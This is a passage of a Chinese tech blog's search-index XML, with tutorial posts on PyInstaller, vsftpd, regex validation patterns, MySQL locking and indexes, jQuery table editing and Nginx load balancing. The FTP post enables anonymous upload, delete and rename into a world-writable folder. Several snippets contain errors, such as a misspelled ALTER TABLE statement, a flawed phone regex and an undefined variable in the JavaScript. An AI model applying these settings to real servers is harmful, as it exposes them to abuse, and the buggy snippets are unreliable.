//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css pace: pace_css: # Internal version: 1.0.0 # https://github.com/hustcc/canvas-nest.js canvas_nest: # three three: # three_waves # https://github.com/jjandxa/three_waves three_waves: # three_waves # https://github.com/jjandxa/canvas_lines canvas_lines: # three_waves # https://github.com/jjandxa/canvas_sphere canvas_sphere: # Internal version: 1.0.0 # https://github.com/zproo/canvas-ribbon canvas_ribbon: # Internal version: 3.3.0 # https://github.com/ethantw/Han han: # needMoreShare2 # https://github.com/revir/need-more-share2 needMoreShare2:# Assetscss: cssjs: jsimages: images# Theme versionversion: 5.1.4]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python打包成exe可执行文件]]></title>
    <url>%2F2019%2F06%2F02%2Fpython%E6%89%93%E5%8C%85%E6%88%90exe%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[安装 pyinstaller1pip install pyinstaller 打包1pyinstaller -F hello.py 打包好的exe文件放在dist文件夹中 打包时加入-w 参数，那么执行 exe文件时将不会有小黑窗 1pyinstaller -F -w hello.py 注意如果打包过程中出现ModuleNotFoundError: No module named &#39;setuptools._vendor&#39; 错误，那么执行下列命令即可： 1pip install --upgrade setuptools]]></content>
      <categories>
        <category>pyhton</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>exe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下搭建ftp服务器]]></title>
    <url>%2F2019%2F06%2F02%2FLinux%E4%B8%8B%E6%90%AD%E5%BB%BAftp%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[[TOC] 1. 安装vsftpd1yum install vsftpd -y 2. 启动服务1service vsftpd start 3. vsftpd的配置 ftp的配置文件主要有三个，位于/etc/vsftpd/目录下，分别是： ftpusers 该文件用来指定那些用户不能访问ftp服务器。 user_list 该文件用来指示的默认账户在默认情况下也不能访问ftp vsftpd.conf vsftpd的主配置文件 4. 修改登录方式默认是匿名登录的，如果你想通过账户去登录则修改vsftpd.conf文件 123456789101112# 允许匿名登录 anonymous_enable=YES# 设置匿名用户的登录目录anon_root=/var/ftp/pub# 打开匿名用户的上传权限anon_upload_enable=YES# 开启匿名用户的下载权限anon_world_readable_only=no# 打开匿名用户创建目录的权限anon_mkdir_write_enable=YES# 打开匿名用户删除和重命名的权限anon_other_write_enable=YES 注意：里面有的配置可能vsftpd.conf 里面没有，则需要你手动添加 5. 创建匿名用户可上传文件夹 默认情况下，ftp的根目录为/var/ftp，为了安全，这个目录默认不允许设置为777权限，否则ftp将无法访问。但是我们要匿名上传文件，需要“other”用户的写权限，正确的做法：在/var/ftp中建立一个upload（名子自己起吧）文件夹，将个文件夹权限设置为777（视具体需要自己设），在upload这个文件夹中，匿名用户可以上传文件、创建文件夹、删除文件等。 123cd /var/ftp/pubmkdir uploadchmod 777 upload 6. 非匿名账户的创建与使用12useradd pibigstarpasswd pibigstar #为pibigstar用户创建密码 7. 访问浏览器或者计算机文件管理系统中输入ftp://你服务器的IP地址 注意：这里默认访问的是 /var/ftp/pub 文件夹下]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>centos</tag>
        <tag>ftp</tag>
        <tag>Linux搭建ftp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见正则表达式剖析]]></title>
    <url>%2F2019%2F06%2F02%2F%E5%B8%B8%E8%A7%81%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%89%96%E6%9E%90%2F</url>
    <content type="text"><![CDATA[没错，又是正则，没办法，这东西入门很简单，但真正能写好，那是真心难，继续学吧。。。基本语法我在这里就不赘述了，需要的话可以关注我公众号，里面有很详细的语法介绍和示例。 今天我们来针对几个常见的正则来慢慢刨析 电话号码这个应该是最常用的，没有之一了吧 手机号 中国的手机号码都是11位数字，所以，最简单的表达式就是： 1[0-9]&#123;11&#125; 不过，目前手机号第1位都是1，第2位取值为3、4、5、7、8之一，所以，更精确的表达式是： 11[3|4|5|7|8|][0-9]&#123;9&#125; 为方便表达手机号，手机号中间经常有连字符(即减号’-‘)，形如：186-1234-5678 为表达这种可选的连字符，表达式可以改为： 11[3|4|5|7|8|][0-9]-?[0-9]&#123;4&#125;-?[0-9]&#123;4&#125; 在手机号前面，可能还有0、+86或0086，和手机号码之间可能还有一个空格，比如：018612345678+86 186123456780086 18612345678 为表达这种形式，可以在号码前加如下表达式： 1((0|\+86|0086)\s?)? 如果为了抽取，也要在左右加环视边界匹配，左右不能是数字。所以，完整的表达式为： 1(?&lt;![0-9])((0|\+86|0086)\s?)?1[3|4|5|7|8|][0-9]-?[0-9]&#123;4&#125;-?[0-9]&#123;4&#125;(?![0-9]) 用Java表示的代码为： 12345public static Pattern MOBILE_PHONE_PATTERN = Pattern.compile( "(?&lt;![0-9])" // 左边不能有数字 + "((0|\\+86|0086)\\s?)?" // 0 +86 0086 + "1[3|4|5|7|8|][0-9]-?[0-9]&#123;4&#125;-?[0-9]&#123;4&#125;" // 186-1234-5678 + "(?![0-9])"); // 右边不能有数字 固定电话 不考虑分机，中国的固定电话一般由两部分组成：区号和市内号码，区号是3到4位，市内号码是7到8位。区号以0开头，表达式可以为： 10[0-9]&#123;2,3&#125; 市内号码表达式为： 1[0-9]&#123;7,8&#125; 区号可能用括号包含，区号与市内号码之间可能有连字符，如以下形式：010-62265678(010)62265678 整个区号是可选的，所以整个表达式为： 1(\(?0[0-9]&#123;2,3&#125;\)?-?)?[0-9]&#123;7,8&#125; 再加上左右边界环视，完整的Java表示为： 12345public static Pattern FIXED_PHONE_PATTERN = Pattern.compile( "(?&lt;![0-9])" // 左边不能有数字 + "(\\(?0[0-9]&#123;2,3&#125;\\)?-?)?" // 区号 + "[0-9]&#123;7,8&#125;"// 市内号码 + "(?![0-9])"); // 右边不能有数字 身份证号码身份证有一代和二代之分，一代是15位数字，二代是18位，都不能以0开头，对于二代身份证，最后一位可能为x或X，其他是数字。 一代身份证表达式可以为： 1[1-9][0-9]&#123;14&#125; 二代身份证可以为： 1[1-9][0-9]&#123;16&#125;[0-9xX] 这两个表达式的前面部分是相同的，二代身份证多了如下内容： 1[0-9]&#123;2&#125;[0-9xX] 所以，它们可以合并为一个表达式，即： 1[1-9][0-9]&#123;14&#125;([0-9]&#123;2&#125;[0-9xX])? 加上左右边界环视，完整的Java表示为： 12345public static Pattern ID_CARD_PATTERN = Pattern.compile( "(?&lt;![0-9])" // 左边不能有数字 + "[1-9][0-9]&#123;14&#125;" // 一代身份证 + "([0-9]&#123;2&#125;[0-9xX])?" // 二代身份证多出的部分 + "(?![0-9])"); // 右边不能有数字 符合这个要求的就一定是身份证号码吗？当然不是，身份证还有一些其他的要求，这里就不探究了 邮箱完整的Email规范比较复杂，我们先看一些实际中常用的。 比如新浪邮箱，它的格式如： 1abc@sina.com 对于用户名部分，它的要求是：4-16个字符，可使用英文小写、数字、下划线，但下划线不能在首尾。怎么验证用户名呢？可以为： 1[a-z0-9][a-z0-9_]&#123;2,14&#125;[a-z0-9] 新浪邮箱的完整Java表达式为： 1234public static Pattern SINA_EMAIL_PATTERN = Pattern.compile( "[a-z0-9]" + "[a-z0-9_]&#123;2,14&#125;" + "[a-z0-9]@sina\\.com"); 我们再来看QQ邮箱，它对于用户名的要求为： 3-18字符，可使用英文、数字、减号、点或下划线 必须以英文字母开头，必须以英文字母或数字结尾 点、减号、下划线不能连续出现两次或两次以上 如果只有第一条，可以为： 1[-0-9a-zA-Z._]&#123;3,18&#125; 为满足第二条，可以改为： 1[a-zA-Z][-0-9a-zA-Z._]&#123;1,16&#125;[a-zA-Z0-9] 怎么满足第三条呢？可以使用边界环视，左边加如下表达式： 1(?![-0-9a-zA-Z._]*(--|\.\.|__)) 完整表达式可以为： 1(?![-0-9a-zA-Z._]*(--|\.\.|__))[a-zA-Z][-0-9a-zA-Z._]&#123;1,16&#125;[a-zA-Z0-9] QQ邮箱的完整Java表达式为： 12345public static Pattern QQ_EMAIL_PATTERN = Pattern.compile( "(?![-0-9a-zA-Z._]*(--|\\.\\.|__))" // 点、减号、下划线不能连续出现两次或两次以上 + "[a-zA-Z]" // 必须以英文字母开头 + "[-0-9a-zA-Z._]&#123;1,16&#125;" // 3-18位 英文、数字、减号、点、下划线组成 + "[a-zA-Z0-9]@qq\\.com"); // 由英文字母、数字结尾 以上都是特定邮箱服务商的要求，一般的邮箱是什么规则呢？一般而言，以@作为分隔符，前面是用户名，后面是域名。用户名的一般规则是： 由英文字母、数字、下划线、减号、点号组成 至少1位，不超过64位 开头不能是减号、点号和下划线 比如：pibigstar@example.com 这个表达式可以为： 1[0-9a-zA-Z][-._0-9a-zA-Z]&#123;0,63&#125; 域名部分以点号分隔为多个部分，至少有两个部分。最后一部分是顶级域名，由2到3个英文字母组成，表达式可以为： 1[a-zA-Z]&#123;2,3&#125; 对于域名的其他点号分隔的部分，每个部分一般由字母、数字、减号组成，但减号不能在开头，长度不能超过63个字符，表达式可以为： 1[0-9a-zA-Z][-0-9a-zA-Z]&#123;0,62&#125; 所以，域名部分的表达式为： 1([0-9a-zA-Z][-0-9a-zA-Z]&#123;0,62&#125;\.)+[a-zA-Z]&#123;2,3&#125; 完整的Java表示为： 12345public static Pattern GENERAL_EMAIL_PATTERN = Pattern.compile( "[0-9a-zA-Z][-._0-9a-zA-Z]&#123;0,63&#125;" // 用户名 + "@" + "([0-9a-zA-Z][-0-9a-zA-Z]&#123;0,62&#125;\\.)+" // 域名部分 + "[a-zA-Z]&#123;2,3&#125;"); // 顶级域名 日期日期的表示方式有很多种，我们只看一种，形如：2017-06-212016-11-1 年月日之间用连字符分隔，月和日可能只有一位。最简单的正则表达式可以为： 1\d&#123;4&#125;-\d&#123;1,2&#125;-\d&#123;1,2&#125; 年一般没有限制，但月只能取值1到12，日只能取值1到31，怎么表达这种限制呢？ 对于月，有两种情况，1月到9月，表达式可以为： 10?[1-9] 10月到12月，表达式可以为： 11[0-2] 所以，月的表达式为： 1(0?[1-9]|1[0-2]) 对于日，有三种情况：1到9号，表达式为：0?[1-9]10号到29号，表达式为：[1-2][0-9]30号和31号，表达式为：3[01]所以，整个表达式为： 1\d&#123;4&#125;-(0?[1-9]|1[0-2])-(0?[1-9]|[1-2][0-9]|3[01]) 加上左右边界环视，完整的Java表示为： 123456public static Pattern DATE_PATTERN = Pattern.compile( "(?&lt;![0-9])" // 左边不能有数字 + "\\d&#123;4&#125;-" // 年 + "(0?[1-9]|1[0-2])-" // 月 + "(0?[1-9]|[1-2][0-9]|3[01])"// 日 + "(?![0-9])"); // 右边不能有数字 URLURL的格式比较复杂，我们只考虑http协议，其通用格式是： 1http://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;?&lt;searchpart&gt; 开始是http://，接着是主机名，主机名之后是可选的端口，再之后是可选的路径，路径后是可选的查询字符串，以?开头。 主机名中的字符可以是字母、数字、减号和点号，所以表达式可以为： 1[-0-9a-zA-Z.]+ 端口部分可以写为： 1(:\d+)? 路径由多个子路径组成，每个子路径以/开头，后跟零个或多个非/的字符，简单的说，表达式可以为： 1(/[^/]*)* 更精确的说，把所有允许的字符列出来，表达式为： 1(/[-\w$.+!*&apos;(),%;:@&amp;=] 对于查询字符串，简单的说，由非空字符串组成，表达式为： 1\?[\S]* 更精确的，把所有允许的字符列出来，表达式为： 1\?[-\w$.+!*&apos;(),%;:@&amp;=]* 路径和查询字符串是可选的，且查询字符串只有在至少存在一个路径的情况下才能出现，其模式为： 1(/&lt;sub_path&gt;(/&lt;sub_path&gt;)*(\?&lt;search&gt;)?)? 所以，路径和查询部分的简单表达式为： 1(/[^/]*(/[^/]*)*(\?[\S]*)?)? 精确表达式为： 1(/[-\w$.+!*&apos;(),%;:@&amp;=]*(/[-\w$.+!*&apos;(),%;:@&amp;=]*)*(\?[-\w$.+!*&apos;(),%;:@&amp;=]*)?)? HTTP的完整Java表达式为： 12345678public static Pattern HTTP_PATTERN = Pattern.compile( "http://" + "[-0-9a-zA-Z.]+" // 主机名 + "(:\\d+)?" // 端口 + "(" // 可选的路径和查询 - 开始 + "/[-\\w$.+!*'(),%;:@&amp;=]*" // 第一层路径 + "(/[-\\w$.+!*'(),%;:@&amp;=]*)*" // 可选的其他层路径 + "(\\?[-\\w$.+!*'(),%;:@&amp;=]*)?" // 可选的查询字符串 + ")?"); // 可选的路径和查询 - 结束 IP地址IP地址格式如下： 1192.168.112.110 点号分隔，4段数字，每个数字范围是0到255。最简单的表达式为： 1(\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1-3&#125; \d{1,3}太简单，没有满足0到255之间的约束，要满足这个约束，就要分多种情况考虑。 值是1位数，前面可能有0到2个0，表达式为： 10&#123;0,2&#125;[0-9] 值是两位数，前面可能有一个0，表达式为： 10?[0-9]&#123;2&#125; 值是三位数，又要分为多种情况。以1开头的，后两位没有限制，表达式为： 11[0-9]&#123;2&#125; 以2开头的，如果第二位是0到4，则第三位没有限制，表达式为： 12[0-4][0-9] 如果第二位是5，则第三位取值为0到5，表达式为： 125[0-5] 所以，\d{1,3}更为精确的表示为： 1(0&#123;0,2&#125;[0-9]|0?[0-9]&#123;2&#125;|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5]) 所以，加上左右边界环视，IP地址的完整Java表示为： 12345public static Pattern IP_PATTERN = Pattern.compile( "(?&lt;![0-9])" // 左边不能有数字 + "((0&#123;0,2&#125;[0-9]|0?[0-9]&#123;2&#125;|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\\.)&#123;3&#125;" + "(0&#123;0,2&#125;[0-9]|0?[0-9]&#123;2&#125;|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])" + "(?![0-9])"); // 右边不能有数字]]></content>
      <categories>
        <category>Java,正则</category>
      </categories>
      <tags>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL实战45讲学习笔记（1~7）]]></title>
    <url>%2F2019%2F05%2F27%2FMySQL%E5%AE%9E%E6%88%9845%E8%AE%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881~7%EF%BC%89%2F</url>
    <content type="text"><![CDATA[本文为极客时间《MySQL实战45讲》的总结笔记，如有侵权，请通知我，将立马删除。建议大家去购买这套课程，真的是物有所值。 1、2一条语句的执行过程1. Mysql结构数据库总共分为两大部分：Server层和存储层，其中Server层又分为：连接器、（查询缓存）、分析器、优化器和执行器。存储层是以插件的形式，常见的有InnoDB和MyISAM。 2. 查询语句（select * from T where id = 2） 通过连接器获取连接 查看语句是存在于查询缓存中，如果存在则直接返回，不存在则进行 步骤3，Mysql 8.0版本之后已经去掉了查询缓存功能 通过分析器判断SQL语句是否正确（要做什么） 通过优化器判断使用哪个索引去查询（怎么做） 执行器判断是否拥有该表权限，如果有则调用存储引擎的拿第一条数据的接口，判断id是否是等于2，如果不等则调用拿下一条数据的接口，如果等于则将结果放入到结果集中，继续判断下一条。 3. 日志mysql中的日志分为两个部分：redo log 和 binlog。redo log ：这个服务于存储引擎， 这个是InnoDB引擎特有的日志系统binlog : 这个服务于Server层，是所有引擎都可以使用的。 redo log 是为了减少磁盘的读写和crash-safe而产生的，它记录了更新、删除、插入语句，当Mysql空闲时就从redo log中读取这些日志，把数据更新到磁盘中。而binlog是记录做了哪些事情，当我们恢复备份信息时，可以读取binlog中的记录，然后去执行redo log中的记录去恢复信息。 4. 更新语句（update T c = c+1 where id = 2） 执行器找存储引擎拿到 id = 2 这一行记录，id是主键，存储引擎直接通过树搜索找到这一行记录，如果这一行所在的数据页在内存中则直接返回，如果不在则去读取磁盘到内存中再返回。 执行器拿到这一行记录，将 c 列的值 +1 得到一行新数据，然后再调用存储引擎接口写入这行新数据 存储引擎拿到这行数据写入到内存中，同时将这个更新操作记录到redo log日志中，此时redo log处于prepare状态，并告诉执行器可以提交事务了 执行器生成这个操作的binlog，并把binlog写入到磁盘中。 执行器调用存储引擎的提交事务的接口，存储引擎把刚刚写入的redo log日志状态更新为commit，这也就是两阶段提交 3. 事务隔离3.1 事务隔离的特性ACID：原子性、一致性、隔离性、持久性 3.2 事务的隔离级别 读未提交：一个事务还未提交，其他事务就可以看到它做的更改 读已提交：一个事务在提交之后，其他事务才能看到它的更改 可重复读：一个事务是启动和提交之间读到数据是一致的，它在未提交时，其他事务无法看到它做的更改 串行化：对同一行记录，写会加写锁，读会加读锁，当出现读写锁冲突的时候，后访问的事务必须等前一个事务执行完才能继续执行。 修改隔离级别：设置参数：transaction-isolation 3.3 事务隔离的实现 每条记录在更新的时候都会记录一条回滚操作，记录上的最新值通过回滚操作都能回到它上一个版本，同一条记录在系统中可以存在多个版本，这就是数据库的多版本并发控制（MVCC） 3.4 回滚日志 回滚日志什么时候删除?系统会判断当没有实物需要用到这些回滚日志的时候，回滚日志会被删除。 什么时候不需要？当系统中没有比这个回滚日志更早的read-view的时候3.5 为什么尽量不使用长事务？ 长事务意味着系统里面会存在很老的事务视图，在这个事务提交之前，回滚记录都要保留，这会导致大量占用存储空间。除此之外，长事务还会占用锁资源，可能会拖垮整个库。 4、5 深入浅出索引（上，下）4.1 索引的实现方式有哪些 哈希表 将值放到数组里，然后用哈希函数将key换算为一个确定的位置 ，将value放到数组的这个位置，当哈希冲突时，会拉出一个链表进行保存。适用场景：只适合等值查询情况，不适合用于范围查询 有序数组 将值按顺序放入到数组中，可采用二分法查询，时间复杂度为O(lg(N))，但是插入比较麻烦，需要移动很多值。适用场景：不再变化的值。 二叉树搜索树 每个结点的左儿子小于父节点，右儿子大于父节点，平衡二叉树是搜索速度最快的数据结构，但是索引不仅存在于内存，也要存储到硬盘中，如果用平衡二叉树，那么100万的数据就是一个树高20的二叉树，对应磁盘就是20个数据块，要查询一个数据要访问20个数据块，这就很慢了。 N叉树 N叉树顾名思义就是每个节点有N儿子，儿子之间从左到右递增。它是为了解决二叉树占用数据块太多而产生的。 4.2 Innodb引擎使用的索引 Innodb是使用B+树来存储数据的。每一张表其实就是由多个B+树组成的，树结点的key值就是某一行的主键，value是该行的其他数据。每一个索引都会创建一个B+树。 4.3 索引的类型 索引分为主键索引和非主键索引，主键索引的叶子结点存放的是这一行的数据，而非主键索引的叶子结点存放的是主键索引的值。当使用主键索引去查询时可以直接获取到该行数据，而使用非主键索引去查询时，先拿到主键的值，再根据主键获取到该行数据，这个过程被称为回表 4.4 覆盖索引表 user，id（主键），name（普通索引） 当我们想查询 name = 张三 的id 时我们可以使用 1select * from user where name = '张三' 这条语句的执行过程为：先去索引树name中找到张三拿到张三的id，再去主键索引树中根据id拿到这条记录，而我们只是需要它的id的，使用这条语句会进行一次回表操作，所以我们可以改为下面语句： 1select id from user where name = '张三' 这种方式就叫做覆盖索引，我们可以通过一些联合索引的方式去避免进行二次回表操作。 4.5 索引最左前缀表 user，id（主键），gender（性别），name（姓名），age（年龄）联合索引（name，age） 当我们查询姓张并且年龄为10岁的男孩时： 1select * from user where name like '张%' and age = 10 and gender = 1 它会先找到第一个姓张的记录，然后再向后依次遍历，这种就避免了全表扫描。 一般来说如果建立了 （a，b）联合索引，就不需要在a上单独建立一个索引了，但是如果是根据b来查，那么还是需要在b上建立索引。 6.全局锁和表级锁61. 全局锁全局锁即是锁住整个数据库，mysql提供了一个加全局读锁的语句(FTWRL)： 1flush table with read lock 加完全局读锁之后，数据库整个的更新，删除，添加语句都会被阻塞，这个使用场景就是数据库备份。但是让数据库处于只读状态，这种方式就会让所有更新被阻塞，整个业务就会停摆。这时我们可以使用官方为我们提供的数据库备份工具mysqldump，通过--single-transaction参数来确保拿到一致性视图: 12备份：mysqldump --single-transaction -u用户名 -p密码 数据库名 &gt; back.sql恢复：mysql -u用户名 -p密码 -f 数据库名&lt; back.sql 这样在备份数据库之前就会启动一个事务，来确保拿到一致性视图，采用这种方式数据库也可以正常更新的。但这种方式有种局限性，那就是必须支持事务，而myisam存储引擎就不支持事务，所以还是得采用全局锁的方式。 问 : 让数据库处于只读状态为什么不用set global readonly=true ?这是因为使用readonly的话，一旦客户端出现异常，那么整个数据库都处于不可用状态了，而使用 FTWRL一旦客户端出现异常，那么就会自动释放这个锁，整个数据库即可恢复到正常状态（可读可写）。 6.2 表级锁mysql中的表级锁有两种，一种就是表锁，另一种是元数据锁（MDL）：meta data lock。 6.2.1 表锁mysql添加表锁可采用下面语句 1lock tables 表名 read,表名 write 释放锁和FTWRL类似，当客户端出现异常后也会自动释放锁。也可手动释放： 1unlock tables 表名 6.2.2 元数据锁（MDL）元数据锁是隐式锁，当访问某一张表时，数据库自动加的锁。 当对表增删改查时：加MDL读锁 当更改表结构时：加MDL写锁 读锁之间不互斥，也就是多个线程可以同时对一个表进行增删改查，但是读写锁和写写锁之间互斥，也即是当更改表结构时要等待读锁或写锁释放后才能进行更改。 问：为什么我就给表加个字段，数据库就崩了？如果在更改表结构之前有一个长事务在操作表（MDL读锁），当我们去添加表中一个字段时那么这个操作会添加一个MDL写锁，由于读写锁互斥，那么这个MDL写锁就会被阻塞，以至于后面的增删改查操作要加MDL读锁的都会被阻塞下去。 为了更加安全的更改表结构我们可以使用下面语句： 1alert table 表名 wait 5 add colunm 列名 这个会等待5秒，如果5秒钟拿不到MDL写锁，那么就不再继续阻塞，也就可以后面的操作继续进行下去。 7. 行锁行锁是在引擎层实现的，但不是每个引擎都支持行锁，像MyISAM引擎就不支持行锁，它想控制并发就只能加表锁。 行锁是有需要时才添加的，但释放是在事务提交之后才进行释放的（两阶段锁），根据这个特性，如果你的事务中需要锁多个行，要把最可能造成锁冲突、最可能影响并发度的锁尽量往后放。 举个例子：用户A在电影院B买一张电影票（3元）需要下面三个过程： 从用户A账户中扣掉 3 元 在电影院B的余额中增加 3 元 记录一条交易日志 这个三个过程是放在一个事务中的，但是 2 过程是最可能造成锁冲突的，因为其他用户买了票之后也要在电影院B的余额中增加 3 元，所以我们要把最可能造成锁冲突的放在后面，这样电影院B余额这一行的锁时间就最少，我们调整顺序为：3 、 1 、 2 7.1 死锁和死锁检测 事务A在等待事务B释放id=2的行锁，而事务B在等待事务A释放id=1的行锁，事务A和事务B互相等待对方的资源释放，这就造成了死锁。 死锁解决 超时释放设置超时时间，通过参数innodb_lock_wait_timeout设置，当超过这个时间之后将自动释放锁资源。默认是50s 死锁检测设置innodb_deadlock_detect为on来开启死锁检测，但它会造成额外的负担，每当一个事务被锁的时候，就要看看它所依赖的线程有没有被别人锁住，如此循环，最后判断是否出现了循环等待，也就是死锁。]]></content>
      <categories>
        <category>数据库,面试,mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>表级锁</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS操作表格常用操作及事件委派]]></title>
    <url>%2F2019%2F05%2F24%2FJS%E6%93%8D%E4%BD%9C%E8%A1%A8%E6%A0%BC%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E5%8F%8A%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%B4%BE%2F</url>
    <content type="text"><![CDATA[JS操作表格常用操作及事件委派1. 点击添加一行表格12345678910111213141516171819202122232425function addRow() &#123; // 获取当前有多少行(查找第一列序号值) last_num = $("#myTabletr:last-child").children("td").find("input").val(); if (last_num == null) &#123; last_num = 1; &#125; else &#123; last_num = parseInt(last_num); last_num += 1; &#125; // 获取表格对象 let table = document.getElementById("myTable"); // 插入一行 let row = table.insertRow(); // 插入四列 let cell0 = row.insertCell();//序号 let cell1= row.insertCell(); //名称 let cell2 = row.insertCell();//年龄 let cell3 = row.insertCell();//操作 // 插入列的内容 cell0.innerHTML = '&lt;input readonly="true" value='+ last_num +'&gt;'; cell1.innerHTML = '&lt;input name="username"placeholder="输名称"&gt;'; cell2.innerHTML = '&lt;input name="age" placeholder="输入年龄"&gt;'; cell3.innerHTML = '&lt;a class="btn-link deleteRowInfo"&gt;删除&lt;/a&gt;'; &#125; 2. 删除一行12345678910111213 $(document).on('click','.deleteRowInfo',function() &#123; // 获取当前点击的哪一行 let currentTrIndex = $(this).parent().parent().index(); // 获取表格对象 let table = document.getElementById("myTable"); // 删除行 table.deleteRow(index); // 更新序号 $("#myTable").find("tr").each(function(index,item)&#123; let tdArr = $(this).children(); tdArr.eq(0).find("input").val(index + 1); &#125;);&#125;); 3. 获取表格中的值转为JSON字符串1234567891011 function getData() &#123; let data = []; $("#myTable").find("tr").each(function (i) &#123; data[i] = new Object(); data[i].username= $(this).find("input[name='username']").val() data[i].age= $(this).find("input[name='age']").val() &#125;); // 转为json字符串 let strData = JSON.stringify(data); return strData;&#125; 4. 添加一列 姓名 派大星 海绵宝宝 年龄 22 25 123456789 $(".addBtn").click(function () &#123; // 获取模态框中输入值 let username= $(".username").val(); let age= $(".age").val(); // 第一行添加一列 $("#usernameTr").append('&lt;td&gt;'+username+'&lt;i class="icon-delete deleteCellInfo hidden"&gt;&lt;/i&gt;&lt;/td&gt;'); // 第二行添加一列 $("#ageTr").append('&lt;td&gt;'+age+'&lt;/td&gt;');&#125;); 5. 删除一列1234567891011// 当鼠标移动到每一列时会有个删除按钮显示，点击这个删除按钮，删除此列 $(document).on('click','.deleteCellInfo',function() &#123; // 获取当前点击的是第几列 var currentCell =$("#usernameTr td i").index(this) + 1; // 获取表格对象 let table=document.getElementById("myTable"); // 删除第一行中此列 table.rows[0].deleteCell(currentCell); // 删除第二行中此列 table.rows[1].deleteCell(currentCell); &#125;); 6. 事件委派 因为是动态添加的表格，所以没办法直接为新添加的元素添加事件监听，这个时候就需要用到了事件委派。其实也就是为页面渲染完成后添加的新元素加上事件。 上面新添加列，我们为每一个新添加的列都添加一个鼠标移入移出事件，当鼠标移入到此列上时将删除图标显示出来。 jQuery写法：使用delegate 12345678// 鼠标移入时将删除hidden属性将删除图标显示出来$('#usernameTr').delegate('td', 'mouseover', function(ev)&#123; $(this).find("i").removeClass("hidden"); &#125;); // 鼠标移出时将删除图标隐藏 $('#usernameTr').delegate('td', 'mouseout', function(ev)&#123; $(this).find("i").addClass("hidden"); &#125;);]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>javscript</tag>
        <tag>jquer</tag>
        <tag>添加表格</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx使用总结]]></title>
    <url>%2F2019%2F05%2F24%2FNginx%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[@[toc] 前期准备windows1.下载nginx， 点击下载 解压并启动nginx, 双击nginx.exe 测试是否启动，访问 http://127.0.0.1 下载tomcat8111（端口为8111的tomcat）点击 这里下载 下载tomcat8222（端口为8222的tomcat）点击这里下载 linux123456789101112# 安装Nginx源库yum install epel-release# 安装Nginxyum install nginx# 查看是否安装成功nginx -v# 查看配置文件地址nginx -t # 启动nginx# 停止nginx -s stop 1. 反向代理1.1 概念 先说正向代理，比如要访问youtube,但是不能直接访问，只能先找个翻墙软件，通过翻墙软件才能访问youtube. 翻墙软件就叫做正向代理。所谓的反向代理，指的是用户要访问youtube,但是youtube悄悄地把这个请求交给bilibili来做，那么bilibili就是反向代理了。在当前教程指的就是访问nginx,但是nginx把请求交给tomcat来做。 1.2 实现修改 nginx.conf 文件 123location / &#123; proxy_pass http://127.0.0.1:8111; &#125; location / 表示处理所有请求proxy_pass http://127.0.0.1:8111 表示把请求都交给：http://127.0.0.1:8111 （tomcat的访问地址）来处理 1.3 访问1、启动tomcat （端口为8111）2、 重启nginx 1nginx -s reload 3、 访问地址http://127.0.0.1 就会发现已经反向代理到：http://127.0.0.1:8111 2. 动静分离2.1 概念 所谓的动静分离就是指图片，css, js之类的都交给nginx来处理，nginx处理不了的，比如jsp 就交给tomcat来处理~ 好处是nginx处理静态内容的吞吐量很高，比tomcat高多了，这样无形中提升了性能。 2.2 实现修改nginx.conf文件 在locaction下面添加一个新的location: 123 location ~\.(css|js|png)$ &#123; root D:/tomcat_8111/webapps/ROOT;&#125; 这表示所有的css js png访问都由nginx来做，访问的地址是:D:/tomcat_8111/webapps/ROOT jsp中： 3. 负载均衡3.1 概念 负载均衡的概念就是当访问量很大的时候，一个 Tomcat 吃不消了，这时候就准备多个 Tomcat，由Nginx按照权重来对请求进行分配，从而缓解单独一个Tomcat受到的压力 3.2 启动两个tomcat记得要修改两个tomcat的端口，两个tomcat的端口不能一样，这里我们使用8111端口和8222端口 3.3 修改nginx.conf文件首先增加一个upstream ，用来指向这两个tomcat 1234upstream tomcat_8111_8222&#123;server 127.0.0.1:8111 weight=1;server 127.0.0.1:8222 weight=2; &#125; 然后修改location，反向代理到上述配置。 123 location / &#123; proxy_pass http://tomcat_8111_8222;&#125; weight表示权重，值越大，被分配到的几率越大。 3.4 重启nginx并访问4. session共享4.1 概念 通过负载均衡课程，我们可以把请求分发到不同的 Tomcat 来缓解服务器的压力，但是这里存在一个问题： 当同一个用户第一次访问tomcat_8111 并且登录成功， 而第二次访问却被分配到了tomcat_8222， 这里并没有记录他的登陆状态，那么就会呈现未登录状态了，严重伤害了用户体验。 4.2 解决办法（一） 通过ip地址标记用户，如果多次请求都是从同一个ip来的，那么就都分配到同一个tomcat.这样就不会出现负载均衡 session问题了. 处理手段也很简单，在nginx.conf 文件中修改upstream结点。如图所示在upstream最后加上ip_hash;就行了。 12345upstream tomcat_8111_8222&#123;server 127.0.0.1:8111 weight=1;server 127.0.0.1:8222 weight=2; ip_hash; &#125; 不过这种方案并不完美，当如下几种情况发生时就有问题： 大量请求来之某个局域网，那么相当于就没有负载均衡了 如果tomcat_8111 